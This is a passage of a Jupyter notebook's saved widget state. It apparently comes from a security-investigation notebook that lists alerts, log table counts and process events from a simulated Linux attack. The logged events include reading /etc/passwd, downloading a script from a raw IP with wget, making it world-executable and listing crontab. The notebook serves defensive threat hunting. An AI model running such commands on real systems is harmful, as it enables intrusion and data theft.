      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "900f9b86943642ce8ba5aa9d8da5c54c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_ceac993ab83b42bdbd36f24029b8f6a6",
        "IPY_MODEL_653ac1c55c2941a092977660b8b2e142"
       ],
       "layout": "IPY_MODEL_7ae5262f431a443badc30f0d6708811d"
      }
     },
     "91c99a21c3f14f5ca9349a6483630762": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "80%"
      }
     },
     "95ad98a152b14cf7a30d5358413ca959": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_866e663650c64c6285956758c0367bdb",
        "IPY_MODEL_a80f8cda959f4954b76ca4c1ba0b4193",
        "IPY_MODEL_82ac6b9543eb497396305f47f2607c21"
       ],
       "layout": "IPY_MODEL_ab4d7dd8896b416690edafd164d9fa2f"
      }
     },
     "95cfabbadff3402294fb0a9d4fb2ff43": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_21187d2070d7427c86308c65da3c2891",
       "style": "IPY_MODEL_25a8693c20bc497b90ec1bc01be1eb3b",
       "value": "2019-02-18 02:12:57.717406"
      }
     },
     "96ebd1e7634e4647953d2027fcca088c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "996a705d3cce48ed98fa006f287fe8fb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_cf99447bf4294324902293b82611f470",
       "style": "IPY_MODEL_157e267dc37a4c1b9727b3608b362b5a",
       "value": "2019-02-14 02:12:57.717406"
      }
     },
     "9c2c91f36f974e8b869f9a7a0abc7782": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "9e969839465944ed9201d6e3b7e465a4": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "300px",
       "width": "95%"
      }
     },
     "a1486e00e5d24dfb8d5a8ceb4bb76644": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "a4f6fb993e044d2bbf11473bd70f7583": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_ac66c20cc0db4feebca1c0bef85cd6fe",
       "style": "IPY_MODEL_03cc127f25c34f9486916954b540c9cd",
       "value": "2019-02-16 01:23:54"
      }
     },
     "a66add71a1fc4b999f7b2cfe8e811865": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_c78acdc1b37c427da31f4107ce6fad19",
       "style": "IPY_MODEL_5795a270a2f245fda15d0b323e0106c7",
       "value": "03:23:54"
      }
     },
     "a80f8cda959f4954b76ca4c1ba0b4193": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "2019-02-12 11:48:01  Security incident with shared process detected (MSTICALERTSWIN1) [id:2518523287189999999_1f19db0b-3d5b-4f7b-b91f-5e994ba4bde5]",
        "2019-02-13 02:50:38  Security incident detected (MSTICALERTSLXVM2) [id:2518522745615999999_30ac5794-a265-4420-a1b7-6335ac08e2c0]",
        "2019-02-14 11:51:38  Suspicious system process executed () [id:2518521557015111330_65a3fe73-0832-427a-aab3-06edc2c27f0a]",
        "2019-02-14 11:51:38  Security incident detected (MSTICALERTSWIN1) [id:2518521557015111330_79f27254-e85f-4471-a061-3ea99b824495]",
        "2019-02-14 11:51:38  Potential attempt to bypass AppLocker detected (MSTICALERTSWIN1) [id:2518521557014927413_daa18e53-ab1d-4d7d-8c4f-bcb86f75fd5f]",
        "2019-02-15 03:50:55  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518520981440769999_caab1270-55d3-4447-8618-16cf8672e4e1]",
        "2019-02-15 04:03:22  Possible suspicious scheduling tasks access detected (MSTICALERTSLXVM2) [id:2518520973978269999_57b6af71-984e-45f3-9aac-d6bbd79eed07]",
        "2019-02-15 19:43:49  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518520409706099999_c5116800-e694-4900-a6e3-28cc7875b093]",
        "2019-02-15 19:55:10  Suspicious Activity Detected () [id:2518520402897969999_b946cd89-667e-4ce7-b571-9603859a7234]",
        "2019-02-16 03:23:54  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518520133657099999_384e00d0-4afc-4e9a-8935-bec64d3951a4]",
        "2019-02-16 20:49:59  SSH Anomalous Login ML () [id:cf3d882a-3dc8-4526-80f0-0962b8d480c1]",
        "2019-02-16 20:54:02  SSH Anomalous Login ML () [id:a37e604d-fc93-43cc-997f-8b5c2fc53990]",
        "2019-02-16 20:59:02  SSH Anomalous Login ML () [id:c10ed21e-c5e6-4e7f-bb86-e586bfa2a2a3]",
        "2019-02-16 21:04:02  SSH Anomalous Login ML () [id:6a5661f9-9a57-4aa8-bb01-1d6743af998e]",
        "2019-02-16 21:09:02  SSH Anomalous Login ML () [id:723f61c8-86bd-46b4-96af-9b6509b0e83e]",
        "2019-02-16 21:14:02  SSH Anomalous Login ML () [id:cdaac819-757e-4296-9b64-5edd7e35e57f]",
        "2019-02-16 21:19:02  SSH Anomalous Login ML () [id:83062676-4b8d-4579-bcc9-196f086b93af]",
        "2019-02-16 21:24:02  SSH Anomalous Login ML () [id:9e25fa59-032f-42be-b8a1-495b773d6ef8]",
        "2019-02-16 23:04:02  SSH Anomalous Login ML () [id:eea9d793-0e7e-4911-a0e9-cf87bea6ec3e]",
        "2019-02-16 23:09:02  SSH Anomalous Login ML () [id:2007a3bf-db86-4a2e-ab4c-240660c6820a]",
        "2019-02-16 23:14:02  SSH Anomalous Login ML () [id:52f884eb-4193-43e7-9e3a-63889edbfb04]",
        "2019-02-16 23:19:02  SSH Anomalous Login ML () [id:6d53e2fc-3cfc-4c04-8396-c3dcbf1caa5e]",
        "2019-02-16 23:24:02  SSH Anomalous Login ML () [id:e782d6be-34d2-41c0-8b39-14ebbeef01a3]",
        "2019-02-16 23:29:02  SSH Anomalous Login ML () [id:3f756526-328e-4dc2-badb-304acded79fe]",
        "2019-02-18 01:09:02  SSH Anomalous Login ML () [id:dbd390dc-7a94-47e4-83e4-60a390e4073c]",
        "2019-02-18 01:14:02  SSH Anomalous Login ML () [id:64a2b4af-c3d7-422c-820b-7f1feb664222]",
        "2019-02-18 01:19:02  SSH Anomalous Login ML () [id:3968ef4e-b322-48ca-b297-e984aff8888d]",
        "2019-02-18 01:24:02  SSH Anomalous Login ML () [id:41f1f6b6-d2ea-4821-9659-0cfab6558cec]",
        "2019-02-18 01:29:02  SSH Anomalous Login ML () [id:214e5829-1a76-445b-845e-bf9ce81c3d4c]"
       ],
       "description": "Select alert :",
       "index": 9,
       "layout": "IPY_MODEL_9e969839465944ed9201d6e3b7e465a4",
       "style": "IPY_MODEL_da3133bd7dd8445eb7685204069cca13"
      }
     },
     "ab4d7dd8896b416690edafd164d9fa2f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "ac66c20cc0db4feebca1c0bef85cd6fe": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "b5e8109bec0f4e428f955db156d401d3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "layout": "IPY_MODEL_91c99a21c3f14f5ca9349a6483630762",
       "max": 1,
       "min": -20,
       "style": "IPY_MODEL_a1486e00e5d24dfb8d5a8ceb4bb76644",
       "value": [
        -13,
        -9
       ]
      }
     },
     "b719c4e400be462484fd475dd7b54299": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "190715",
        "190671"
       ],
       "description": "Select Session to view",
       "index": 0,
       "layout": "IPY_MODEL_678036be13354ccea16934cafbac1a0e",
       "style": "IPY_MODEL_60b8c51979c64ee4b1545523de0c5ca5"
      }
     },
     "bcb10ef32f8044ebbdc0b818b39d5dc5": {
      "model_module": "plotlywidget",
      "model_module_version": "^0.5.2",
      "model_name": "FigureModel",
      "state": {
       "_config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "_data": [
        {
         "domain": {
          "x": [
           0,
           1
          ],
          "y": [
           0,
           1
          ]
         },
         "labels": [
          "SecurityBaselineSummary",
          "ConfigurationChange",
          "ConfigurationData",
          "HuntingBookmark",
          "SecurityEvent",
          "ProtectionStatus",
          "SecurityBaseline",
          "AzureActivity",
          "SecurityDetection",
          "Operation",
          "Heartbeat",
          "Usage",
          "AwsEventsSample_CL",
          "OfficeActivity",
          "SqlLogArtifacts_CL",
          "AzureMetrics",
          "AzureDiagnostics",
          "Syslog",
          "SecurityAlert",
          "SSHAlertDataV1_CL",
          "AzureNetworkAnalytics_CL",
          "ThreatIntelSample_CL",
          "ProcessCreationSqlV2_CL",
          "SSHAlertDataV2_CL",
          "BYOThreatIntelv1_CL",
          "UpdateSummary",
          "Syslog_CL",
          "Update",
          "SSHAlertDataV2cls_CL",
          "ScratchData_CL",
          "ProcessCreationSqlV1_CL",
          "AuditLog_CL",
          "MruArtifacts_CL",
          "AutorunsArtifacts_CL",
          "AmcacheArtifacts_CL"
         ],
         "marker": {
          "colors": [
           "rgb(31, 118, 179)",
           "rgb(254, 127, 14)",
           "rgb(44, 160, 44)",
           "rgb(214, 39, 39)",
           "rgb(147, 102, 189)",
           "rgb(140, 86, 74)",
           "rgb(227, 119, 193)",
           "rgb(127, 127, 127)",
           "rgb(188, 189, 33)",
           "rgb(23, 189, 206)",
           "rgb(31, 118, 179)",
           "rgb(254, 127, 14)",
           "rgb(44, 160, 44)",
           "rgb(214, 39, 39)",
           "rgb(147, 102, 189)",
           "rgb(140, 86, 74)",
           "rgb(227, 119, 193)",
           "rgb(127, 127, 127)",
           "rgb(188, 189, 33)",
           "rgb(23, 189, 206)",
           "rgb(31, 118, 179)",
           "rgb(254, 127, 14)",
           "rgb(44, 160, 44)",
           "rgb(214, 39, 39)",
           "rgb(147, 102, 189)",
           "rgb(140, 86, 74)",
           "rgb(227, 119, 193)",
           "rgb(127, 127, 127)",
           "rgb(188, 189, 33)",
           "rgb(23, 189, 206)",
           "rgb(31, 118, 179)",
           "rgb(254, 127, 14)",
           "rgb(44, 160, 44)",
           "rgb(214, 39, 39)",
           "rgb(147, 102, 189)"
          ]
         },
         "name": "count_",
         "textinfo": "label+percent",
         "type": "pie",
         "uid": "4a04246c-c777-4dd2-8abc-233c22c93601",
         "values": [
          343,
          21345,
          241901,
          18,
          1399521,
          9613,
          52484,
          116630,
          6514,
          7164,
          692938,
          37697,
          510,
          1994,
          141584,
          7553690,
          174374,
          1333367,
          6727,
          1,
          9954831,
          27,
          75323,
          15,
          6,
          1071,
          3451,
          218050,
          1,
          70792,
          75323,
          53359986,
          6714992,
          76846402,
          362040170
         ]
        }
       ],
       "_js2py_pointsCallback": {},
       "_js2py_relayout": {},
       "_js2py_restyle": {},
       "_js2py_update": {},
       "_layout": {
        "annotations": [
         {
          "showarrow": false,
          "text": "count_",
          "x": 0.5,
          "y": -0.05
         }
        ],
        "showlegend": true,
        "template": {},
        "title": "piechart"
       },
       "_py2js_addTraces": {},
       "_py2js_animate": {},
       "_py2js_deleteTraces": {},
       "_py2js_moveTraces": {},
       "_py2js_removeLayoutProps": {},
       "_py2js_removeTraceProps": {},
       "_py2js_restyle": {},
       "_py2js_update": {},
       "_view_count": 0
      }
     },
     "bd42adc713f44cbe96edda9e96e39920": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_dom_classes": [
        "widget-interact"
       ],
       "children": [
        "IPY_MODEL_0d1e1b55b3884efc8fed40b2683e84da",
        "IPY_MODEL_1e482a4c9d4b4c29a0ba2505a5553467"
       ],
       "layout": "IPY_MODEL_084c38dd6bf64a17a7d9ef7dc2eafbdc"
      }
     },
     "c3c2d8b6a53244cfbc722607bdbe4089": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "c4ef515eec0248e08ca1c93fe07d25a6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "c701f168e4de4185b77f8106ab4c2ed0": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_0c33633715e94f20a3b7df8acbd4e315",
       "outputs": [
        {
         "data": {
          "text/markdown": "24 process events",
          "text/plain": "<IPython.core.display.Markdown object>"
         },
         "metadata": {},
         "output_type": "display_data"
        },
        {
         "data": {
          "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TimeGenerated</th>\n      <th>NewProcessName</th>\n      <th>CommandLine</th>\n      <th>NewProcessId</th>\n      <th>SubjectUserSid</th>\n      <th>cwd</th>\n      <th>ClusterSize</th>\n      <th>SubjectLogonId</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>4930</th>\n      <td>2019-02-16 03:51:57.305</td>\n      <td>/bin/bash</td>\n      <td>bash -c './LinuxSimulateAttack.sh'</td>\n      <td>22930</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>1.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>4932</th>\n      <td>2019-02-16 03:51:57.317</td>\n      <td>/usr/bin/lscpu</td>\n      <td>lscpu</td>\n      <td>22932</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>4933</th>\n      <td>2019-02-16 03:51:57.317</td>\n      <td>/bin/uname</td>\n      <td>uname -a</td>\n      <td>22931</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>4934</th>\n      <td>2019-02-16 03:51:57.325</td>\n      <td>/sbin/ifconfig</td>\n      <td>ifconfig</td>\n      <td>22933</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>4935</th>\n      <td>2019-02-16 03:51:57.329</td>\n      <td>/bin/cat</td>\n      <td>cat /etc/passwd</td>\n      <td>22934</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>4936</th>\n      <td>2019-02-16 03:51:57.333</td>\n      <td>/bin/cat</td>\n      <td>cat /var/spool/mail/mail</td>\n      <td>22935</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>4937</th>\n      <td>2019-02-16 03:51:57.341</td>\n      <td>/usr/bin/wget</td>\n      <td>wget http://23.97.60.214/QuZYpObins.sh -t</td>\n      <td>22936</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>5035</th>\n      <td>2019-02-16 03:52:15.349</td>\n      <td>/bin/chmod</td>\n      <td>chmod 777 QuZYpObins.sh</td>\n      <td>22956</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>5037</th>\n      <td>2019-02-16 03:52:15.353</td>\n      <td>/bin/grep</td>\n      <td>grep QuZYpObinxs</td>\n      <td>22959</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n    <tr>\n      <th>5038</th>\n      <td>2019-02-16 03:52:15.357</td>\n      <td>/usr/bin/crontab</td>\n      <td>crontab -l</td>\n      <td>22958</td>\n      <td>1001</td>\n      <td>/home/dbadmin</td>\n      <td>2.0</td>\n      <td>190715</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
          "text/plain": "               TimeGenerated    NewProcessName  \\\n4930 2019-02-16 03:51:57.305         /bin/bash   \n4932 2019-02-16 03:51:57.317    /usr/bin/lscpu   \n4933 2019-02-16 03:51:57.317        /bin/uname   \n4934 2019-02-16 03:51:57.325    /sbin/ifconfig   \n4935 2019-02-16 03:51:57.329          /bin/cat   \n4936 2019-02-16 03:51:57.333          /bin/cat   \n4937 2019-02-16 03:51:57.341     /usr/bin/wget   \n5035 2019-02-16 03:52:15.349        /bin/chmod   \n5037 2019-02-16 03:52:15.353         /bin/grep   \n5038 2019-02-16 03:52:15.357  /usr/bin/crontab   \n\n                                       CommandLine NewProcessId  \\\n4930            bash -c './LinuxSimulateAttack.sh'        22930   \n4932                                         lscpu        22932   \n4933                                      uname -a        22931   \n4934                                      ifconfig        22933   \n4935                               cat /etc/passwd        22934   \n4936                      cat /var/spool/mail/mail        22935   \n4937  wget http://23.97.60.214/QuZYpObins.sh -t           22936   \n5035                       chmod 777 QuZYpObins.sh        22956   \n5037                              grep QuZYpObinxs        22959   \n5038                                    crontab -l        22958   \n\n     SubjectUserSid            cwd  ClusterSize SubjectLogonId  \n4930           1001  /home/dbadmin          1.0         190715  \n4932           1001  /home/dbadmin          2.0         190715  \n4933           1001  /home/dbadmin          2.0         190715  \n4934           1001  /home/dbadmin          2.0         190715  \n4935           1001  /home/dbadmin          2.0         190715  \n4936           1001  /home/dbadmin          2.0         190715  \n4937           1001  /home/dbadmin          2.0         190715  \n5035           1001  /home/dbadmin          2.0         190715  \n5037           1001  /home/dbadmin          2.0         190715  \n5038           1001  /home/dbadmin          2.0         190715  "
         },
         "metadata": {},
         "output_type": "display_data"
        }
       ]
      }
     },
     "c78acdc1b37c427da31f4107ce6fad19": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "ceac993ab83b42bdbd36f24029b8f6a6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_ef9074a16f32467ab041e1abc00ecd27",
       "style": "IPY_MODEL_40cea5745bf7422c9d459b52c6512d0a",
       "value": {
        "date": 27,
        "month": 1,
        "year": 2019
       }
      }
     },
     "cf3ad28455e14bb8a5c0e6527c016d34": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "300px",
       "width": "95%"
      }
     },
     "cf99447bf4294324902293b82611f470": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "d0546b64ddab46038dbbd2017f71240f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "80%"
      }
     },
     "d1c4ba46508041709a2ba44d36fa2b14": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_dom_classes": [
        "widget-interact"
       ],
       "children": [
        "IPY_MODEL_b719c4e400be462484fd475dd7b54299",
        "IPY_MODEL_c701f168e4de4185b77f8106ab4c2ed0"
       ],
       "layout": "IPY_MODEL_23810ecd80fb4708920aa309260757a8"
      }
     },
     "d8fcc0dcac3b403696a7ffca50bd3574": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "da3133bd7dd8445eb7685204069cca13": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "dcda9745cff5490bb5f377ba91a4bc37": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "1px solid black"
      }
     },
     "e693a044603d4edfaa1d04fe165871ca": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "ebbab620af614bbebfced2e7c3461c56": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "ebf397681d5549ce83f8882da2348827": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "ef9074a16f32467ab041e1abc00ecd27": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "ef96ea59eb4f4d7e887601723024c9fa": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "1px solid black"
      }
     },
     "f529cdc0164e474885fb72704a7e72aa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "2019-02-12 11:48:01  Security incident with shared process detected (MSTICALERTSWIN1) [id:2518523287189999999_1f19db0b-3d5b-4f7b-b91f-5e994ba4bde5]",
        "2019-02-13 02:50:38  Security incident detected (MSTICALERTSLXVM2) [id:2518522745615999999_30ac5794-a265-4420-a1b7-6335ac08e2c0]",
        "2019-02-14 11:51:38  Suspicious system process executed () [id:2518521557015111330_65a3fe73-0832-427a-aab3-06edc2c27f0a]",
        "2019-02-14 11:51:38  Security incident detected (MSTICALERTSWIN1) [id:2518521557015111330_79f27254-e85f-4471-a061-3ea99b824495]",
        "2019-02-14 11:51:38  Potential attempt to bypass AppLocker detected (MSTICALERTSWIN1) [id:2518521557014927413_daa18e53-ab1d-4d7d-8c4f-bcb86f75fd5f]",
        "2019-02-15 03:50:55  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518520981440769999_caab1270-55d3-4447-8618-16cf8672e4e1]",
        "2019-02-15 04:03:22  Possible suspicious scheduling tasks access detected (MSTICALERTSLXVM2) [id:2518520973978269999_57b6af71-984e-45f3-9aac-d6bbd79eed07]",
        "2019-02-15 19:43:49  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518520409706099999_c5116800-e694-4900-a6e3-28cc7875b093]",
        "2019-02-15 19:55:10  Suspicious Activity Detected () [id:2518520402897969999_b946cd89-667e-4ce7-b571-9603859a7234]",
        "2019-02-16 03:23:54  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518520133657099999_384e00d0-4afc-4e9a-8935-bec64d3951a4]",
        "2019-02-16 20:49:59  SSH Anomalous Login ML () [id:cf3d882a-3dc8-4526-80f0-0962b8d480c1]",
        "2019-02-16 20:54:02  SSH Anomalous Login ML () [id:a37e604d-fc93-43cc-997f-8b5c2fc53990]",
        "2019-02-16 20:59:02  SSH Anomalous Login ML () [id:c10ed21e-c5e6-4e7f-bb86-e586bfa2a2a3]",
        "2019-02-16 21:04:02  SSH Anomalous Login ML () [id:6a5661f9-9a57-4aa8-bb01-1d6743af998e]",
        "2019-02-16 21:09:02  SSH Anomalous Login ML () [id:723f61c8-86bd-46b4-96af-9b6509b0e83e]",
        "2019-02-16 21:14:02  SSH Anomalous Login ML () [id:cdaac819-757e-4296-9b64-5edd7e35e57f]",
        "2019-02-16 21:19:02  SSH Anomalous Login ML () [id:83062676-4b8d-4579-bcc9-196f086b93af]",
        "2019-02-16 21:24:02  SSH Anomalous Login ML () [id:9e25fa59-032f-42be-b8a1-495b773d6ef8]",
        "2019-02-16 23:04:02  SSH Anomalous Login ML () [id:eea9d793-0e7e-4911-a0e9-cf87bea6ec3e]",
        "2019-02-16 23:09:02  SSH Anomalous Login ML () [id:2007a3bf-db86-4a2e-ab4c-240660c6820a]",
        "2019-02-16 23:14:02  SSH Anomalous Login ML () [id:52f884eb-4193-43e7-9e3a-63889edbfb04]",
        "2019-02-16 23:19:02  SSH Anomalous Login ML () [id:6d53e2fc-3cfc-4c04-8396-c3dcbf1caa5e]",
        "2019-02-16 23:24:02  SSH Anomalous Login ML () [id:e782d6be-34d2-41c0-8b39-14ebbeef01a3]",
        "2019-02-16 23:29:02  SSH Anomalous Login ML () [id:3f756526-328e-4dc2-badb-304acded79fe]",
        "2019-02-18 01:09:02  SSH Anomalous Login ML () [id:dbd390dc-7a94-47e4-83e4-60a390e4073c]",
        "2019-02-18 01:14:02  SSH Anomalous Login ML () [id:64a2b4af-c3d7-422c-820b-7f1feb664222]",
        "2019-02-18 01:19:02  SSH Anomalous Login ML () [id:3968ef4e-b322-48ca-b297-e984aff8888d]",
        "2019-02-18 01:24:02  SSH Anomalous Login ML () [id:41f1f6b6-d2ea-4821-9659-0cfab6558cec]",
        "2019-02-18 01:29:02  SSH Anomalous Login ML () [id:214e5829-1a76-445b-845e-bf9ce81c3d4c]"
       ],
       "description": "Select alert :",
       "index": 9,
       "layout": "IPY_MODEL_cf3ad28455e14bb8a5c0e6527c016d34",
       "style": "IPY_MODEL_6b030b8c0d3941d280d1c7db3856632b"
      }
     },
     "f6cead2f6f174cdda89a078b16ab9bad": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "fcd42225da6949f8b17d48c697ba2f4f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     }
    },
    "version_major": 2,
    "version_minor": 0
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
